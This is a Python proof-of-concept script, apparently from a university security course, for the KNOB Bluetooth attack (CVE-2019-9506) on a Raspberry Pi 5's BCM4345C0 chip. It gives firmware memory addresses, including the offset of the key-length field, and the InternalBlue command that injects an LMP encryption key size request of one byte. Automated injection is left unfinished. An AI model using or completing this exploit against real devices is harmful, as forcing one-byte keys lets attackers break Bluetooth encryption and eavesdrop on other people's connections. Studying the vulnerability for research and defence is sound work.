#!/usr/bin/env python3
# KNOB_PoC_BCM4345C0.py
#
# KNOB Attack Proof of Concept for Raspberry Pi 5 (BCM4345C0)
# CVE-2019-9506
#
# Authors: Marco & Riccardo Citron
# Course: Security of Advanced Networking and Services
#
# Based on InternalBlue framework (seemoo-lab/internalblue)
# Reference: https://github.com/francozappa/knob
#
# STATUS: Phase 2 — In Development
#
# Known addresses for BCM4345C0 (chip ID 0x6119):
#   CONNECTION_ARRAY_ADDRESS     = 0x204BA8  (from fw_0x6119.py)
#   CONNECTION_STRUCT_LENGTH     = 0x150     (from fw_0x6119.py)
#   Key length offset in struct  = 0xA7      (found by this project)
#   lmulp_sendLcp                = 0x92062   (from fw_0x6119.py)
#
# Unknown (ROM required):
#   lm_SendLmpEncryptKeySizeReq  = unknown
#   Global key entropy variable  = unknown
#
# Approach: use sendlmp to inject LMP_encryption_key_size_req
# with key size = 1 during an active BR/EDR connection.

import sys
from internalblue.hcicore import HCICore
from internalblue.utils.packing import p16, u16

# BCM4345C0 memory constants
CONNECTION_ARRAY_ADDRESS = 0x204BA8
CONNECTION_STRUCT_LENGTH = 0x150
KEY_LEN_OFFSET = 0xA7

# LMP opcode for LMP_encryption_key_size_req
LMP_ENCRYPTION_KEY_SIZE_REQ_OPCODE = 16  # 0x10

def get_key_len_address(array_index=0):
    """Calculate key length field address for a given connection array index."""
    return CONNECTION_ARRAY_ADDRESS + (array_index * CONNECTION_STRUCT_LENGTH) + KEY_LEN_OFFSET

def main():
    internalblue = HCICore()
    internalblue.interface = internalblue.device_list()[0][1]

    if not internalblue.connect():
        print("[-] No connection to target device.")
        sys.exit(-1)

    print("[*] Connected to BCM4345C0")
    print("[*] Installing KNOB PoC via sendlmp...")
    print("[*] LMP_encryption_key_size_req will be sent with key size = 1")
    print()
    print("[!] Make sure a BR/EDR connection is active before sending.")
    print("[!] Use: sendlmp --conn_handle 0xB 16 -d 01")
    print()
    print("[-] Automated sendlmp injection: TODO (Phase 2)")
    print("    Manual command to run in InternalBlue CLI:")
    print("    > sendlmp --conn_handle <handle> 16 -d 01")

if __name__ == "__main__":
    main()
